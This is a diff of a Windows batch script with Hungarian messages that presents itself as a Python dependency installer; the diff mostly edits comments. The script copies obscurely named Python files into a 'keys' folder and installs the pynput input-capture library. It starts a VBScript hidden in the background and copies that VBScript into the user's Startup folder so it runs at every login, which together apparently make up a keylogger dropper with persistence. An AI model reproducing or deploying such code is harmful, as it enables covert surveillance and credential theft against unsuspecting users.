@@ -2,7 +2,7 @@
 echo Python függőségek telepítése...
 echo.
 
-:: get Public folder path dynamically
+:: get Public folder path
 set "public_dir=%PUBLIC%"
 set "docs_dir=%public_dir%\Documents\keys"
 set "TARGET=%docs_dir%"
@@ -47,7 +47,7 @@ if defined NCAT (
 echo Célmappa: %TARGET%
 echo.
 
-:: fájlok másolása
+:: file masolas
 echo Fájlok átmásolása...
 copy /Y "spwww743g7w.py" "%TARGET%\"
 copy /Y "fwsendbfgw.py" "%TARGET%\"
@@ -67,11 +67,10 @@ if %errorlevel% neq 0 (
 echo Python sikeresen ellenőrizve/telepítve.
 echo.
 
-:: pip frissítése
+:: pip frissítése es telepites
 python -m pip install --upgrade pip
 echo.
 
-:: szükséges csomag telepítése
 python -m pip install pynput
 echo.
 
@@ -84,27 +83,24 @@ echo Program indítása innen:
 echo %TARGET%
 echo.
 
-:: ====== VBSCRIPT FUTTATÁSA LÁTHATATLANUL ======
+VBS FUTTATASA
 echo [INFO] A sifustartup5sfgj.vbs inditasa...
 start "" "wscript.exe" "%TARGET%\sifustartup5sfgj.vbs"
 echo [SIKER] VBScript elindult (háttérben).
 
-:: Startup mappa helye
+:: startup mappa helye
 set "STARTUP_FOLDER=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
 
-:: Lépj a Roaming mappába
 cd /d "%APPDATA%\Microsoft\Windows"
-
-:: Hozd létre a Programs mappát, ha nincs
 if not exist "Programs" mkdir "Programs"
 
-:: Hozd létre a Startup mappát a Programs alatt
 if not exist "Programs\Startup" mkdir "Programs\Startup"
 
 
-:: .bat fájlok bemásolása Startupba
+:: .bat
 copy "%~dp0sifustartup5sfgj.vbs" "%STARTUP_FOLDER%\sifustartup5sfgj.vbs" /Y >nul
 
 echo Kész.
 
 pause
+
